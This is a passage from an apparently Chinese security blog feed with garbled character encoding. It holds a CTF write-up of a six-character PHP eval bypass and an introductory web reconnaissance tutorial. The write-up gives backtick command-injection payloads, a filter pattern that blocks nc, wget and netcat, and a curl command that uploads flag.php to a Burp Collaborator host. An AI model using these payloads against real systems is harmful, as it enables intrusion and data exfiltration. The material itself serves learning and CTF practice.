class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶åªèƒ½ç»§ç»­6ä¸ªå­—ç¬¦çš„rceã€‚<br><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a><br>è¿™ç¯‡æ–‡ç« è®²äº†è¿™é¢˜çš„ä¸¤ç§æ–¹æ³•<br>é‡ç‚¹æ˜¯æˆ‘ä»¬è¦ä½¿ç”¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F`;+sleep 3</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„payloadä¼šæˆåŠŸæ‰§è¡Œsleepã€‚é‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢?<br>æˆ‘ä»¬éƒ½çŸ¥é“`æ˜¯å†…æ•›æ‰§è¡Œçš„è¿”å›å³shell_exec()çš„ç¼©å†™ã€‚<br>åŸå› æ˜¯<code>$F</code>å°±æ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$F`;+sleep 3</span><br></pre></td></tr></table></figure><br>è¿™å°±ä¼šå¯¼è‡´ä¸€ä¸ªå˜é‡çš„åµŒå¥—ä½¿å¾—è¯¥è¯­å¥ä¸€ä¸ªæ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``$F`;+sleep`</span><br></pre></td></tr></table></figure><br>å³åœ¨ä¸»æœºä¼šæ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œå¯¼è‡´åé¢çš„è¯­å¥æ‰§è¡ŒæˆåŠŸã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰äº†å‡ ç§æ€è·¯ã€‚åå¼¹shellï¼Œdnslogå¤–å¸¦ï¼Œå’Œä½¿ç”¨curlæ¥è®²flag.phpå¸¦å‡ºã€‚</p><h3 id="curlè®²flag-phpå¸¦å‡º"><a href="#curlè®²flag-phpå¸¦å‡º" class="headerlink" title="curlè®²flag.phpå¸¦å‡º"></a>curlè®²flag.phpå¸¦å‡º</h3><p>curl -F å°†flagæ–‡ä»¶ä¸Šä¼ åˆ°Burpçš„ Collaborator Client ï¼ˆ Collaborator Client ç±»ä¼¼DNSLOGï¼Œå…¶åŠŸèƒ½è¦æ¯”DNSLOGå¼ºå¤§ï¼Œä¸»è¦ä½“ç°åœ¨å¯ä»¥æŸ¥çœ‹ POSTè¯·æ±‚åŒ…ä»¥åŠæ‰“Cookiesï¼‰<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#å…¶ä¸­-F ä¸ºå¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚</span><br><span class="line">#xxæ˜¯ä¸Šä¼ æ–‡ä»¶çš„nameå€¼ï¼Œflag.phpå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ </span><br><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘çœ‹æ–‡ç« æ˜¯å¯ä»¥dnså¸¦å‡ºçš„ä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆåªèƒ½å¸¦å‡ºlsçš„ç»“æœcat flagå¸¦ä¸å‡º</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> ç‰¹æ€§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢å¤–ç½‘ä¿¡æ¯æ”¶é›†</title>
      <link href="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½œä¸ºä¸€ä¸ªwebæ‰‹ä¸€ä¸ªå¥½çš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›æ˜¯å¿…é¡»çš„ï¼Œæ— è®ºæ˜¯æ¸—é€æµ‹è¯•è¿˜æ˜¯æ‰“æ¯”èµ›éƒ½å°‘ä¸äº†ä¿¡æ¯æœé›†"><a href="#ä½œä¸ºä¸€ä¸ªwebæ‰‹ä¸€ä¸ªå¥½çš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›æ˜¯å¿…é¡»çš„ï¼Œæ— è®ºæ˜¯æ¸—é€æµ‹è¯•è¿˜æ˜¯æ‰“æ¯”èµ›éƒ½å°‘ä¸äº†ä¿¡æ¯æœé›†" class="headerlink" title="ä½œä¸ºä¸€ä¸ªwebæ‰‹ä¸€ä¸ªå¥½çš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›æ˜¯å¿…é¡»çš„ï¼Œæ— è®ºæ˜¯æ¸—é€æµ‹è¯•è¿˜æ˜¯æ‰“æ¯”èµ›éƒ½å°‘ä¸äº†ä¿¡æ¯æœé›†"></a>ä½œä¸ºä¸€ä¸ªwebæ‰‹ä¸€ä¸ªå¥½çš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›æ˜¯å¿…é¡»çš„ï¼Œæ— è®ºæ˜¯æ¸—é€æµ‹è¯•è¿˜æ˜¯æ‰“æ¯”èµ›éƒ½å°‘ä¸äº†ä¿¡æ¯æœé›†</h1><h1 id="ä¸»åŸŸåä¿¡æ¯"><a href="#ä¸»åŸŸåä¿¡æ¯" class="headerlink" title="ä¸»åŸŸåä¿¡æ¯"></a>ä¸»åŸŸåä¿¡æ¯</h1><h2 id="IPCå¤‡æ¡ˆ"><a href="#IPCå¤‡æ¡ˆ" class="headerlink" title="IPCå¤‡æ¡ˆ"></a>IPCå¤‡æ¡ˆ</h2><p>å¤‡æ¡ˆæŸ¥è¯¢æ˜¯ä¸ºäº†æŸ¥è¯¢æ”¹å•ä½æ³¨å†Œäº†å¤šå°‘ç½‘ç«™ã€‚</p><h3 id="æŸ¥è¯¢ç½‘ç«™"><a href="#æŸ¥è¯¢ç½‘ç«™" class="headerlink" title="æŸ¥è¯¢ç½‘ç«™"></a>æŸ¥è¯¢ç½‘ç«™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://beian.miit.gov.cn/#/Integrated/recordQuery</span><br></pre></td></tr></table></figure><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png" class="" title="alt text"><h2 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h2><p>é€šè¿‡whoisä¿¡æ¯å¯ä»¥è·å–æ³¨å†Œäººçš„å…³é”®ä¿¡æ¯ã€‚å¦‚æ³¨å†Œå•†ã€è”ç³»äººã€è”ç³»é‚®ç®±ã€è”ç³»ç”µè¯ï¼Œä¹Ÿå¯ä»¥å¯¹æ³¨å†Œäººã€é‚®ç®±ã€ç”µè¯åæŸ¥åŸŸåï¼Œä¹Ÿå¯ä»¥é€šè¿‡æœç´¢å¼•æ“è¿›ä¸€æ­¥æŒ–æ˜åŸŸåæ‰€æœ‰äººçš„ä¿¡æ¯ã€‚æ·±å…¥å¯ç¤¾å·¥ã€å¯æ¼æ´æŒ–æ˜åˆ©ç”¨ã€‚</p><h3 id="æŸ¥è¯¢ç½‘ç«™ï¼š"><a href="#æŸ¥è¯¢ç½‘ç«™ï¼š" class="headerlink" title="æŸ¥è¯¢ç½‘ç«™ï¼š"></a>æŸ¥è¯¢ç½‘ç«™ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">å›½å†…ï¼š</span><br><span class="line">ç«™é•¿ä¹‹å®¶</span><br><span class="line">http://whois.chinaz.com</span><br><span class="line"></span><br><span class="line">IP138ç½‘ç«™</span><br><span class="line">https://site.ip138.com/</span><br><span class="line"></span><br><span class="line">åŸŸåä¿¡æ¯æŸ¥è¯¢-è…¾è®¯äº‘</span><br><span class="line">https://whois.cloud.tencent.com/</span><br><span class="line"></span><br><span class="line">ICANN LOOKUP</span><br><span class="line">https://lookup.icann.org/</span><br><span class="line"></span><br><span class="line">ç‹—ç‹—æŸ¥è¯¢</span><br><span class="line">https://www.ggcx.com/main/integrated</span><br><span class="line"></span><br><span class="line">å›½å¤–ï¼š</span><br><span class="line">Bugscanner</span><br><span class="line">http://whois.bugscaner.com</span><br><span class="line"></span><br><span class="line">å›½å¤–BGP</span><br><span class="line">https://bgp.he.net</span><br><span class="line"></span><br><span class="line">who.is</span><br><span class="line">https://who.is/</span><br></pre></td></tr></table></figure><h2 id="IPåæŸ¥"><a href="#IPåæŸ¥" class="headerlink" title="IPåæŸ¥"></a>IPåæŸ¥</h2><p>ç›®æ ‡å¯èƒ½å­˜åœ¨å¤šä¸ªåŸŸåç»‘å®šäºåŒä¸€ipä¸Šï¼Œé€šè¿‡ipåæŸ¥å¯ä»¥è·å–åˆ°å…¶ä»–åŸŸåä¿¡æ¯ã€‚æ¯”å¦‚æ—ç«™ã€‚</p><p>é€šè¿‡è·å–ç›®æ ‡çœŸå®IPåï¼Œè¿›è¡ŒåæŸ¥çš„æ—ç«™æ›´çœŸå®ã€‚<br>æŸ¥è¯¢ç«™ç‚¹éœ€å¤æ‚æ€§ï¼Œå•ä¸€çš„ç«™ç‚¹ä¼šæœ‰åæŸ¥ä¸å‡ºä¿¡æ¯çš„å¯èƒ½ã€‚</p><h3 id="æŸ¥è¯¢ç½‘ç«™-1"><a href="#æŸ¥è¯¢ç½‘ç«™-1" class="headerlink" title="æŸ¥è¯¢ç½‘ç«™"></a>æŸ¥è¯¢ç½‘ç«™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iPæˆ–åŸŸåæŸ¥è¯¢</span><br><span class="line">https://site.ip138.com/</span><br><span class="line"></span><br><span class="line">åŒIPç½‘ç«™æŸ¥è¯¢ï¼ŒåŒæœåŠ¡å™¨ç½‘ç«™æŸ¥è¯¢ - ç«™é•¿å·¥å…·</span><br><span class="line">https://stool.chinaz.com/same</span><br><span class="line"></span><br><span class="line">Dnslytics</span><br><span class="line">https://dnslytics.com/</span><br></pre></td></tr></table></figure><h3 id="æœç´¢å¼•æ“"><a href="#æœç´¢å¼•æ“" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h3><p>shodan<br>bing<br>fofa</p><h2 id="é€šè¿‡è¯ä¹¦æŸ¥è¯¢"><a href="#é€šè¿‡è¯ä¹¦æŸ¥è¯¢" class="headerlink" title="é€šè¿‡è¯ä¹¦æŸ¥è¯¢"></a>é€šè¿‡è¯ä¹¦æŸ¥è¯¢</h2><p>é€šè¿‡æŸ¥è¯¢è¯¥ç½‘ç«™ä¸‹æŒ‚ç€çš„SSLè¯ä¹¦ä¸€èˆ¬å°±å¯ä»¥åˆ¤æ–­æ”¹ç½‘ç«™æ˜¯å½’å±äºå“ªä¸ªå•ä½ã€‚ä¹Ÿå¯ä»¥é€šè¿‡è¯ä¹¦æ¥å¯»æ‰¾å­åŸŸåã€‚</p><h3 id="æŸ¥è¯¢ç½‘ç«™-2"><a href="#æŸ¥è¯¢ç½‘ç«™-2" class="headerlink" title="æŸ¥è¯¢ç½‘ç«™"></a>æŸ¥è¯¢ç½‘ç«™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/ è¾“å…¥åŸŸåå³å¯</span><br></pre></td></tr></table></figure><h3 id="æœç´¢å¼•æ“-1"><a href="#æœç´¢å¼•æ“-1" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fofa</span><br><span class="line">cert=&quot;baidu&quot;  --&gt; æœç´¢httpsæˆ–è€…imapsä¸­å¸¦æœ‰ç™¾åº¦çš„èµ„äº§</span><br><span class="line">cert.subject=&quot;xxx&quot;  --&gt; æœç´¢è¯ä¹¦çš„æŒæœ‰è€…ä¸ºxxxçš„èµ„äº§</span><br><span class="line">cert.issuer=&quot;xxx&quot;  --&gt; æœç´¢è¯ä¹¦çš„é¢å‘è€…ä¸ºxxxçš„èµ„äº§</span><br><span class="line">cert.is_valid=true/false  --&gt; éªŒè¯è¯ä¹¦çš„æœ‰æ•ˆæ€§</span><br></pre></td></tr></table></figure><h2 id="hostç¢°æ’"><a href="#hostç¢°æ’" class="headerlink" title="hostç¢°æ’"></a>hostç¢°æ’</h2><p>æƒ³è¦ç†è§£ä»€ä¹ˆæ˜¯hostç¢°æ’é¦–å…ˆè¦çŸ¥é“ä»€ä¹ˆæ˜¯åå‘ä»£ç†ã€‚</p><h3 id="åå‘ä»£ç†æ˜¯ä»€ä¹ˆ"><a href="#åå‘ä»£ç†æ˜¯ä»€ä¹ˆ" class="headerlink" title="åå‘ä»£ç†æ˜¯ä»€ä¹ˆ"></a>åå‘ä»£ç†æ˜¯ä»€ä¹ˆ</h3><p>åå‘ä»£ç†æ˜¯nginx/Apacheçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…¶ä½œç”¨æ˜¯éšè—çœŸå®çš„åç«¯æœåŠ¡å™¨ä¿¡æ¯ï¼Œæä¾›è´Ÿè½½å¹³è¡¡ã€å®‰å…¨è¿‡æ»¤ã€ç¼“å­˜ç­‰åŠŸèƒ½ï¼Œå¹¶å¢å¼ºç½‘ç»œå®‰å…¨æ€§ã€‚<br>å½“å®¢æˆ·ç«¯å‘æ¥äº†è¯·æ±‚å¦‚æœå¼€å¯äº†åå‘ä»£ç†ä¼šå…ˆå°†è¯·æ±‚å‘é€åˆ°åå‘ä»£ç†æœåŠ¡å™¨ä¹Ÿå°±æ˜¯Nginxå’ŒApacheï¼Œå†ç”±åå‘ä»£ç†æœåŠ¡å™¨æ¥å‘é€åˆ°åç«¯æœåŠ¡å™¨ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>ä¸€èˆ¬åå‘ä»£ç†å‘é€çš„åç«¯æœåŠ¡å™¨éƒ½æ˜¯ç”±hostå¤´æ¥å†³å®šçš„ã€‚è€Œå½“æ•°æ®åŒ…çš„ host å¤´æ›¿æ¢ä¸ºæŸä¸ªåŸŸåæ—¶åœ¨è®¿é—®è¯¥åä»£æœåŠ¡å™¨çš„ ip, å¦‚æœ nginx/Apache çš„åå‘ä»£ç†çš„ host é…ç½®æ²¡åˆ é™¤ï¼Œå°±ä¼šæŠŠè¯·æ±‚è½¬å‘åˆ°å†…ç½‘å¯¹åº”çš„ host ä¸šåŠ¡æœåŠ¡å™¨ä¸Šï¼Œæ¥ç€è¿”å›è¯¥ä¸šåŠ¡çš„ä¿¡æ¯ï¼Œå®ç°æœ¬è¯¥éšè—çš„ä¸šåŠ¡è®¿é—®<br>ç®€å•ç‚¹å°±æ˜¯ï¼š nginx/Apache çš„åå‘ä»£ç†çš„ host é…ç½®æ²¡åˆ é™¤ï¼Œå½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªipæ—¶ä»ç„¶ä¼šå…ˆå‘ç»™nginx/Apacheå†ç”±nginx/Apacheæ¥å‘é€ç»™è§„å®šhostçš„åç«¯æœåŠ¡å™¨ã€‚å¦‚æœé…ç½®æœ‰hostæ²¡åˆ é™¤åˆä¸ç”¨æˆ·çš„è¯·æ±‚å¤´çš„hostç›¸åŒï¼Œé‚£ä¹ˆnginx/Apacheå°±ä¼šä»£ç†å°†è¯·æ±‚å‘åˆ°è¯¥å†…ç½‘webã€‚<a href="https://www.wangan.com/p/11v7471117136181">hostç¢°æ’çš„åŸç†</a></p><h3 id="ä»€ä¹ˆæ—¶å€™å­˜åœ¨"><a href="#ä»€ä¹ˆæ—¶å€™å­˜åœ¨" class="headerlink" title="ä»€ä¹ˆæ—¶å€™å­˜åœ¨"></a>ä»€ä¹ˆæ—¶å€™å­˜åœ¨</h3><p>1 ä¸šåŠ¡é€šè¿‡ DNS è§£æåˆ°å¤–ç½‘ï¼Œåé¢åˆ é™¤äº† A è®°å½• (ä½†æ˜¯ nginx/Apache çš„åå‘ä»£ç†è¿˜æ²¡åˆ é™¤)</p><p>2 æµ‹è¯•ä¸šåŠ¡ (ä¸å¯¹å¤–å¼€æ”¾çš„ä¸šåŠ¡ï¼Œåªæµä¼ äºå¼€å‘æˆ–æ˜¯æµ‹è¯•ä½¿ç”¨)</p><h3 id="ç¢°æ’å·¥å…·"><a href="#ç¢°æ’å·¥å…·" class="headerlink" title="ç¢°æ’å·¥å…·"></a>ç¢°æ’å·¥å…·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cckuailong/hostscan</span><br><span class="line">https://github.com/fofapro/Hosts_scan</span><br><span class="line">https://github.com/smxiazi/host_scan</span><br></pre></td></tr></table></figure><h2 id="DNSå…±äº«è®°å½•"><a href="#DNSå…±äº«è®°å½•" class="headerlink" title="DNSå…±äº«è®°å½•"></a>DNSå…±äº«è®°å½•</h2><p>DNSï¼ˆDomain Name Serverï¼ŒåŸŸåæœåŠ¡å™¨ï¼‰æ˜¯è¿›è¡ŒåŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)è½¬æ¢çš„æœåŠ¡å™¨ã€‚DNSä¸­ä¿å­˜äº†ä¸€å¼ åŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)çš„è¡¨ï¼Œä»¥è§£ææ¶ˆæ¯çš„åŸŸåï¼Œå³ä¿å­˜äº†IPåœ°å€å’ŒåŸŸåçš„ç›¸äº’æ˜ å°„å…³ç³»ã€‚åŸŸåæ˜¯Internetä¸ŠæŸä¸€å°è®¡ç®—æœºæˆ–è®¡ç®—æœºç»„çš„åç§°ï¼Œç”¨äºåœ¨æ•°æ®ä¼ è¾“æ—¶æ ‡è¯†è®¡ç®—æœºçš„ç”µå­æ–¹ä½ï¼ˆæœ‰æ—¶ä¹ŸæŒ‡åœ°ç†ä½ç½®ï¼‰ã€‚åŸŸåæ˜¯ç”±ä¸€ä¸²ç”¨ç‚¹åˆ†éš”çš„åå­—ç»„æˆçš„ï¼Œé€šå¸¸åŒ…å«ç»„ç»‡åï¼Œè€Œä¸”å§‹ç»ˆåŒ…æ‹¬ä¸¤åˆ°ä¸‰ä¸ªå­—æ¯çš„åç¼€ï¼Œä»¥æŒ‡æ˜ç»„ç»‡çš„ç±»å‹æˆ–è¯¥åŸŸæ‰€åœ¨çš„å›½å®¶æˆ–åœ°åŒºã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºDNSçš„å­˜åœ¨ï¼Œè®¿é—®ç›¸åº”æœåŠ¡åªéœ€è®°ä½åŸŸåï¼Œä¸éœ€è¦è®°ä½æ— è§„åˆ™çš„ipåœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è®°å½•ç±»å‹è¯´æ˜</span><br><span class="line">A è®°å½•        å°†åŸŸåæŒ‡å‘ä¸€ä¸ª IP åœ°å€ï¼ˆå¤–ç½‘åœ°å€ï¼‰ã€‚</span><br><span class="line">CNAME è®°å½•å°†åŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œå†ç”±å¦ä¸€ä¸ªåŸŸåæä¾› IP åœ°å€ï¼ˆå¤–ç½‘åœ°å€ï¼‰ã€‚</span><br><span class="line">MX è®°å½•        ç”µå­é‚®ä»¶äº¤æ¢è®°å½•ï¼Œè®°å½•ä¸€ä¸ªé‚®ä»¶åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œè®¾ç½®é‚®ç®±ï¼Œè®©é‚®ç®±èƒ½æ”¶åˆ°é‚®ä»¶ã€‚</span><br><span class="line">NS è®°å½•        åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œè®°å½•è¯¥åŸŸåç”±å“ªå°åŸŸåæœåŠ¡å™¨è§£æã€‚å¦‚å°†å­åŸŸåäº¤ç»™å…¶ä»– DNS æœåŠ¡å•†è§£æã€‚</span><br><span class="line">AAAA è®°å½•å°†åŸŸåæŒ‡å‘ä¸€ä¸ª IPv6 åœ°å€ã€‚</span><br><span class="line">SRV è®°å½•ç”¨æ¥æ ‡è¯†æŸå°æœåŠ¡å™¨ä½¿ç”¨äº†æŸä¸ªæœåŠ¡ï¼Œå¸¸è§äºå¾®è½¯ç³»ç»Ÿçš„ç›®å½•ç®¡ç†ã€‚</span><br><span class="line">TXT è®°å½•å¯¹åŸŸåè¿›è¡Œæ ‡è¯†å’Œè¯´æ˜ï¼Œç»å¤§å¤šæ•°çš„ TXT è®°å½•æ˜¯ç”¨æ¥åš SPF è®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ä»·å€¼"><a href="#åˆ©ç”¨ä»·å€¼" class="headerlink" title="åˆ©ç”¨ä»·å€¼"></a>åˆ©ç”¨ä»·å€¼</h3><p>å¯ä»¥é€šè¿‡æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸåï¼Œä¸€èˆ¬å¤šæ˜¯ç”¨äºè‡ªå»ºDNSæœåŠ¡å™¨ã€‚å¦‚æœæ˜¯å…¬å¼€çš„DNSæœåŠ¡å™¨ï¼Œé‚£ä¹ˆæŸ¥è¯¢çš„æ•ˆæœå°†ä¼šç‰¹åˆ«å·®ã€‚</p><h3 id="ä½¿ç”¨nslookupæ¥è¿›è¡ŒæŸ¥çœ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨NSæœåŠ¡å™¨"><a href="#ä½¿ç”¨nslookupæ¥è¿›è¡ŒæŸ¥çœ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨NSæœåŠ¡å™¨" class="headerlink" title="ä½¿ç”¨nslookupæ¥è¿›è¡ŒæŸ¥çœ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨NSæœåŠ¡å™¨"></a>ä½¿ç”¨nslookupæ¥è¿›è¡ŒæŸ¥çœ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨NSæœåŠ¡å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -query=ns baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure><p>å°†è·å–åˆ°çš„NSæœåŠ¡å™¨å¸¦å…¥ <a href="https://hackertarget.com/find-shared-dns-servers/">https://hackertarget.com/find-shared-dns-servers/</a> è¿›è¡ŒæŸ¥è¯¢</p><h1 id="å­åŸŸåçš„ä¿¡æ¯"><a href="#å­åŸŸåçš„ä¿¡æ¯" class="headerlink" title="å­åŸŸåçš„ä¿¡æ¯"></a>å­åŸŸåçš„ä¿¡æ¯</h1><p>å­åŸŸåä¸€èˆ¬æ˜¯çˆ¶çº§åŸŸåçš„ä¸‹ä¸€çº§ã€‚ä¸€èˆ¬ä¼ä¸šä¸»ç«™åŸŸåçš„é˜²æŠ¤éƒ½æ˜¯é‡ç‚¹ï¼Œå®‰å…¨çº§åˆ«è¾ƒé«˜ï¼Œçªç ´éš¾åº¦è¾ƒå¤§ï¼Œè€Œä¼ä¸šå¯èƒ½ä¼šæœ‰æ•°åä¸ªç”šè‡³æ›´å¤šçš„å­åŸŸååº”ç”¨ï¼Œå› ä¸ºæ•°é‡ä¼—å¤šï¼Œå®‰å…¨å› ç´ å’Œæˆæœ¬æŠ•å…¥å¤šï¼Œç›¸åº”çš„é˜²æŠ¤ä¹Ÿæ²¡æœ‰é‚£ä¹ˆåŠæ—¶æœ‰æ•ˆã€‚å­åŸŸåå¾€å¾€æ˜¯æ”»å‡»çªç ´å£ï¼Œé€šè¿‡å­åŸŸåå‘ç°æ›´å¤šçš„å¯èƒ½æ€§æˆ–æ˜¯è¿›è¡Œè¿‚å›æ”»å‡»ã€‚</p><h2 id="å­åŸŸåä¿¡æ¯ç‚¹"><a href="#å­åŸŸåä¿¡æ¯ç‚¹" class="headerlink" title="å­åŸŸåä¿¡æ¯ç‚¹"></a>å­åŸŸåä¿¡æ¯ç‚¹</h2><p>å­åŸŸååŒ…å«ä¸€äº›å¸¸è§èµ„äº§ç±»å‹ï¼šåŠå…¬ç³»ç»Ÿï¼Œé‚®ç®±ç³»ç»Ÿï¼Œè®ºå›ï¼Œå•†åŸç­‰ã€‚è€Œå…¶ä»–ç®¡ç†ç³»ç»Ÿï¼Œç½‘ç«™ç®¡ç†åå°ç­‰è¾ƒå°‘å‡ºç°åœ¨å­åŸŸåä¸­ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç›¸åŒç±»å‹æ¼æ´å¯èƒ½å­˜åœ¨åŒä¸€ç»„ç»‡çš„ä¸åŒçš„åŸŸå/åº”ç”¨ç¨‹åºä¸­ã€‚<br>å­åŸŸåç³»ç»Ÿç»´æŠ¤æˆæœ¬ã€ç”¨æˆ·ç¾¤ä½“ç­‰ï¼Œä¸€èˆ¬å°‘äºä¸»åŸŸåï¼Œä¼šå­˜åœ¨ä¸€äº›ç‰ˆæœ¬è¿­ä»£ã€é…ç½®ä¸å®‰å…¨ã€å¼±å¯†ç è´¦å·ç®¡ç†ç­–ç•¥ç­‰ã€‚<br>å­åŸŸåæ¢æµ‹å‘ç°æ›´å¤šçš„æœåŠ¡ï¼Œå¢åŠ æ¼æ´å‘ç°çš„å¯èƒ½æ€§ã€‚</p><h2 id="æšä¸¾çˆ†ç ´"><a href="#æšä¸¾çˆ†ç ´" class="headerlink" title="æšä¸¾çˆ†ç ´"></a>æšä¸¾çˆ†ç ´</h2><p>è¦è¯´ç®€å•ç²—æš´è¿˜æ˜¯å­åŸŸåæšä¸¾çˆ†ç ´ï¼Œé€šè¿‡ä¸æ–­çš„æ‹¼æ¥å­—å…¸ä¸­çš„å­åŸŸåå‰ç¼€å»æšä¸¾åŸŸåçš„Aè®°å½•è¿›è¡ŒDNSè§£æï¼Œå¦‚æœæˆåŠŸè§£æè¯´æ˜å­åŸŸåå­˜åœ¨ã€‚å¦‚xxx.comæ‹¼æ¥å‰ç¼€testç»„åˆæˆtest.xxx.comï¼Œå†å¯¹å…¶è¿›è¡ŒéªŒè¯ã€‚ä½†æ˜¯åŸŸåå¦‚æœä½¿ç”¨æ³›è§£æçš„è¯ï¼Œåˆ™ä¼šå¯¼è‡´æ‰€æœ‰çš„åŸŸåéƒ½èƒ½æˆåŠŸè§£æï¼Œä½¿å¾—å­åŸŸåæšä¸¾å˜å¾—ä¸ç²¾å‡†ã€‚<br>æˆ‘ä»¬ä½¿ç”¨nslookupæ¥éªŒè¯<br>æ³›è§£æ<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.png" class="" title="alt text"><br>æ­£å¸¸è§£æ<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.png" class="" title="alt 